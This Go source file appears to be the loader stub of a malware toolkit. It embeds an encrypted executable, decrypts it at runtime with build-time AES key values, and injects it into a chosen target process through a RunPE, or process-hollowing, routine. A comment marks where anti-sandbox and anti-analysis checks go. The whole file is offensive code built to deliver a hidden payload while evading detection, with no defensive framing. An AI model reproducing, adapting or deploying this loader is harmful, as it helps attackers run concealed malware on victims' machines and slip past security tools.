package main

import (
	_ "embed"
	"os"

	"github.com/pygrum/karmine/karl/runpe"
	"github.com/pygrum/karmine/krypto/kes"
)

var (
	aeskey string
	X1     string
	X2     string
	Target string
)

//go:embed karma.exe
var fileBytes []byte

func main() {
	/*
		Anti-sandbox / analysis checks
	*/
	fileBytes, err := kes.DecryptObject(fileBytes, aeskey, X1, X2)
	if err != nil {
		os.Exit(1)
	}
	runpe.Inject(Target, "", fileBytes)
}
